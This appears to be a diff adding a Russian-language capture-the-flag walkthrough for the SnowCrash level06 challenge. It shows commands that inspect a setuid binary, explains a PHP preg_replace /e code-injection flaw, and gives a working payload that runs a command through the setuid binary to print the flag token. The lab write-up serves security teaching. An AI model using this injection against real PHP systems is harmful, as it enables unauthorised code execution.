@@ -1,0 +1,57 @@
+level06@SnowCrash:~$ ls -l
+total 12
+-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+
+
+так как на level06 есть suid, значить выполнять необходимо будет его
+
+level06@SnowCrash:~$ strings level06
+...
+/usr/bin/php
+/home/user/level06/level06.php
+...
+
+level06@SnowCrash:~$ ./level06
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+Понимаем, что он выполняет скрипт php который лежит рядом
+
+
+
+Тестируя понимаем, что первым аргументом level06 принимает файл, который будет распаршен
+level06@SnowCrash:~$ cat level06.php
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+....
+
+
+
+
+level06@SnowCrash:~$ cat level06.php
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+
+В скрипте есть строка
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
+								 ^
+								 |
+							это означает, что далее найденный паттерн выполниться в php коде, в нашем случае в функции y()
+
+дальнейшее выполнение нас не интересует, главное, чтобы php выполнил getflag для этого создаем файл, который будем ему подавать
+echo  '[x ${`/bin/getflag`}]' > /tmp/php
+
+Запускаем и получаем
+level06@SnowCrash:~$ ./level06 /tmp/php
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
